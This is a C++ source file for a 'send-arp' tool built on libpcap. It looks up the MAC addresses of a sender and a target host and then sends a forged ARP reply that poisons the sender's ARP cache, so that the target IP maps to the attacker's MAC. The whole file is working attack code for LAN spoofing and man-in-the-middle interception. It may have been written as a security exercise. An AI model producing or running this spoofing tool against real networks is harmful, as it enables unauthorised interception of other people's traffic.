#include <cstdio>
#include <pcap.h>
#include <arpa/inet.h>
#include "getHostInfo.h"
#include "ethhdr.h"
#include "arphdr.h"

#pragma pack(push, 1)
struct EthArpPacket final
{
    EthArpPacket(uint8_t mode, Mac ether_dmac, Mac ether_smac, Mac arp_smac, Ip arp_sip, Mac arp_tmac, Ip arp_tip)
    {
        eth_.dmac_ = ether_dmac;
        eth_.smac_ = ether_smac;
        eth_.type_ = htons(EthHdr::Arp);

        arp_.hrd_ = htons(ArpHdr::ETHER);
        arp_.pro_ = htons(EthHdr::Ip4);
        arp_.op_ = htons(mode);
        arp_.hln_ = Mac::SIZE;
        arp_.pln_ = Ip::SIZE;

        arp_.smac_ = arp_smac;
        arp_.sip_ = htonl(arp_sip);
        arp_.tmac_ = arp_tmac;
        arp_.tip_ = htonl(arp_tip);
    }
	
	EthHdr eth_;
	ArpHdr arp_;    
};
#pragma pack(pop)

void usage()
{
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

void sendArp(pcap_t *handle, EthArpPacket pkt)
{
	int res = pcap_sendpacket(handle, reinterpret_cast<const u_char*>(&pkt), sizeof(EthArpPacket));
	if (res != 0) {
		fprintf(stderr, "pcap_sendpacket return %d error=%s\n", res, pcap_geterr(handle));
	}
	else
	{
		printf("[*] Arp packet sending succeeded!");
	}
}

Mac getMac(pcap_t* handle, Ip attackerIp, Mac attackerMac, Ip ip)
{
		EthArpPacket pkt(
		ArpHdr::Request,
		Mac::broadcastMac(),
		attackerMac,
		attackerMac,
		attackerIp,
		Mac::nullMac(),
		ip
	);

	sendArp(handle, pkt);
	
	while (true)
		{
			struct pcap_pkthdr *header;
			const u_char *reply_packet;
			int result = pcap_next_ex(handle, &header, &reply_packet);
			if (result != 1)
			{
				continue;
			}
			EthArpPacket *reply = (EthArpPacket *)reply_packet;

			if (ntohs(reply->eth_.type_) == EthHdr::Arp && ntohs(reply->arp_.op_) == ArpHdr::Reply &&
				reply->arp_.sip_ == Ip(htonl(ip)) && reply->arp_.tip_ == Ip(htonl(attackerIp)))
			{
				// sendArpThread.detach();
				return reply->arp_.smac_;
			}
		}
}

int main(int argc, char *argv[])
{
	// parameter check
	if (argc < 4 || (argc % 2) != 0)
	{
		usage();
		return -1;
	}
	// for multiple execution
	int iter;
	for (iter = 2; iter <= argc-1; iter += 2)
	{
		printf("[*] send-arp #%d..",iter/2);

		char *dev = argv[1];
		const char *interfaceName = argv[1];
		
		Ip attackerIp;
		Mac attackerMac;
		
		getHostInfo(interfaceName, &attackerIp, &attackerMac);

		// Open pcap handle
		char errbuf[PCAP_ERRBUF_SIZE];
		pcap_t *handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
		if (handle == nullptr)
		{
			fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
			return -1;
		}
		printf("[*] get sender Info..");

		Ip senderIp = Ip(argv[iter]);
		Mac senderMac = getMac(handle, attackerIp, attackerMac, senderIp);
		printf("[+] senderIp    : %s\n", std::string(senderIp).c_str());
		printf("[+] senderMac   : %s\n", std::string(senderMac).c_str());

		printf("[*] get target Info..");


		Ip targetIp = Ip(argv[iter+1]);
		Mac targetMac = getMac(handle, attackerIp, attackerMac, targetIp);
		printf("[+] targetIp    : %s\n", std::string(targetIp).c_str());
		printf("[+] targetMac   : %s\n", std::string(targetMac).c_str());
		

		// Send ARP Reply packet to infect sender's ARP table
		// sendArp(handle, EthArpPacket(ArpHdr::Reply, senderMac, attackerMac, EthHdr::Arp, ArpHdr::ETHER, EthHdr::Ip4, Mac::SIZE, Ip::SIZE, attackerMac, targetIp, senderMac, senderIp));
		sendArp(
		handle,
		EthArpPacket(
        ArpHdr::Reply,
        senderMac,
        attackerMac,
        attackerMac,
        targetIp,
        senderMac,
        senderIp
    )
);
		pcap_close(handle);
	}
}